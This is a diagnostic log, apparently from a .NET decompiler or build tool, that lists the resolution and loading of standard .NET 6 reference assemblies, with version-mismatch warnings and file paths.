Found single assembly: 'System.Diagnostics.Tracing, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.Tracing.dll'
------------------
Resolve: 'System.IO.FileSystem.DriveInfo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.FileSystem.DriveInfo, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.FileSystem.DriveInfo.dll'
------------------
Resolve: 'System.IO.IsolatedStorage, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.IsolatedStorage, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.IsolatedStorage.dll'
------------------
Resolve: 'System.ComponentModel, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ComponentModel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ComponentModel.dll'
------------------
Resolve: 'System.Threading.Thread, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.Thread, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.Thread.dll'
------------------
Resolve: 'System.Reflection.Emit, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Emit, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Emit.dll'
------------------
Resolve: 'System.Reflection.Emit.ILGeneration, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Emit.ILGeneration, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Emit.ILGeneration.dll'
------------------
Resolve: 'System.Reflection.Emit.Lightweight, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Emit.Lightweight, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Emit.Lightweight.dll'
------------------
Resolve: 'System.Reflection.Primitives, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Primitives.dll'
------------------
Resolve: 'System.Resources.Writer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Resources.Writer, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Resources.Writer.dll'
------------------
Resolve: 'System.Runtime.CompilerServices.VisualC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.CompilerServices.VisualC, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.CompilerServices.VisualC.dll'
------------------
Resolve: 'System.Runtime.InteropServices.RuntimeInformation, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.InteropServices.RuntimeInformation, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.InteropServices.RuntimeInformation.dll'
------------------
Resolve: 'System.Runtime.Serialization.Formatters, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.Serialization.Formatters, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.Serialization.Formatters.dll'
------------------
Resolve: 'System.Security.AccessControl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.AccessControl, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.AccessControl.dll'
------------------
Resolve: 'System.IO.FileSystem.AccessControl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.FileSystem.AccessControl, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.FileSystem.AccessControl.dll'
------------------
Resolve: 'System.Threading.AccessControl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Could not find by name: 'System.Threading.AccessControl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
------------------
Resolve: 'System.Security.Claims, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Claims, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Claims.dll'
------------------
Resolve: 'System.Security.Cryptography.Algorithms, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Algorithms, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Algorithms.dll'
------------------
Resolve: 'System.Security.Cryptography.Primitives, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Primitives.dll'
------------------
Resolve: 'System.Security.Cryptography.Csp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Csp, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Csp.dll'
------------------
Resolve: 'System.Security.Cryptography.Encoding, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Encoding, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Encoding.dll'
------------------
Resolve: 'System.Security.Cryptography.X509Certificates, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.X509Certificates, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.X509Certificates.dll'
------------------
Resolve: 'System.Text.Encoding.Extensions, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Text.Encoding.Extensions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Text.Encoding.Extensions.dll'
------------------
Resolve: 'System.Threading, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.dll'
------------------
Resolve: 'System.Threading.Overlapped, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.Overlapped, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.Overlapped.dll'
------------------
Resolve: 'System.Threading.ThreadPool, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.ThreadPool, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.ThreadPool.dll'
------------------
Resolve: 'System.Threading.Tasks.Parallel, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.Tasks.Parallel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.Tasks.Parallel.dll'
------------------
Resolve: 'System.Runtime, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.dll'
------------------
Resolve: 'System.IO.MemoryMappedFiles, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.MemoryMappedFiles, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.MemoryMappedFiles.dll'
------------------
Resolve: 'System.IO.Pipes, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.Pipes, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.Pipes.dll'
------------------
Resolve: 'System.Diagnostics.Process, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.Process, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.Process.dll'
------------------
Resolve: 'System.Security.Cryptography.X509Certificates, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.X509Certificates, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.X509Certificates.dll'
------------------
Resolve: 'System.Memory, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Memory, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Memory.dll'
------------------
Resolve: 'System.Collections, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.dll'
------------------
Resolve: 'System.Collections.NonGeneric, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections.NonGeneric, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.NonGeneric.dll'
------------------
Resolve: 'System.Collections.Concurrent, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections.Concurrent, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.Concurrent.dll'
------------------
Resolve: 'System.ObjectModel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ObjectModel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ObjectModel.dll'
------------------
Resolve: 'System.Collections.Specialized, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections.Specialized, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.Specialized.dll'
------------------
Resolve: 'System.ComponentModel.TypeConverter, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ComponentModel.TypeConverter, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ComponentModel.TypeConverter.dll'
------------------
Resolve: 'System.ComponentModel.EventBasedAsync, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ComponentModel.EventBasedAsync, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ComponentModel.EventBasedAsync.dll'
------------------
Resolve: 'System.ComponentModel.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ComponentModel.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ComponentModel.Primitives.dll'
------------------
Resolve: 'System.ComponentModel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ComponentModel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ComponentModel.dll'
------------------
Resolve: 'Microsoft.Win32.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'Microsoft.Win32.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\Microsoft.Win32.Primitives.dll'
------------------
Resolve: 'System.Console, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Console, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Console.dll'
------------------
Resolve: 'System.Data.Common, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Data.Common, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Data.Common.dll'
------------------
Resolve: 'System.Runtime.InteropServices, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.InteropServices, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.InteropServices.dll'
------------------
Resolve: 'System.Diagnostics.TraceSource, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.TraceSource, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.TraceSource.dll'
------------------
Resolve: 'System.Diagnostics.Contracts, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.Contracts, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.Contracts.dll'
------------------
Resolve: 'System.Diagnostics.TextWriterTraceListener, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.TextWriterTraceListener, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.TextWriterTraceListener.dll'
------------------
Resolve: 'System.Diagnostics.FileVersionInfo, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.FileVersionInfo, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.FileVersionInfo.dll'
------------------
Resolve: 'System.Diagnostics.StackTrace, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.StackTrace, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.StackTrace.dll'
------------------
Resolve: 'System.Diagnostics.Tracing, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.Tracing, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.Tracing.dll'
------------------
Resolve: 'System.Drawing.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Drawing.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Drawing.Primitives.dll'
------------------
Resolve: 'System.Linq.Expressions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Linq.Expressions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Linq.Expressions.dll'
------------------
Resolve: 'System.IO.Compression.Brotli, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Found single assembly: 'System.IO.Compression.Brotli, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.Compression.Brotli.dll'
------------------
Resolve: 'System.IO.Compression, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Found single assembly: 'System.IO.Compression, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.Compression.dll'
------------------
Resolve: 'System.IO.Compression.ZipFile, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Found single assembly: 'System.IO.Compression.ZipFile, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.Compression.ZipFile.dll'
------------------
Resolve: 'System.IO.FileSystem.DriveInfo, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.FileSystem.DriveInfo, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.FileSystem.DriveInfo.dll'
------------------
Resolve: 'System.IO.FileSystem.Watcher, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.FileSystem.Watcher, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.FileSystem.Watcher.dll'
------------------
Resolve: 'System.IO.IsolatedStorage, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.IO.IsolatedStorage, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.IO.IsolatedStorage.dll'
------------------
Resolve: 'System.Linq, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Linq, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Linq.dll'
------------------
Resolve: 'System.Linq.Queryable, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Linq.Queryable, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Linq.Queryable.dll'
------------------
Resolve: 'System.Linq.Parallel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Linq.Parallel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Linq.Parallel.dll'
------------------
Resolve: 'System.Threading.Thread, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.Thread, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.Thread.dll'
------------------
Resolve: 'System.Net.Requests, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.Requests, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Requests.dll'
------------------
Resolve: 'System.Net.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Primitives.dll'
------------------
Resolve: 'System.Net.HttpListener, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Net.HttpListener, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.HttpListener.dll'
------------------
Resolve: 'System.Net.ServicePoint, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Net.ServicePoint, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.ServicePoint.dll'
------------------
Resolve: 'System.Net.NameResolution, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.NameResolution, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.NameResolution.dll'
------------------
Resolve: 'System.Net.WebClient, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Net.WebClient, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.WebClient.dll'
------------------
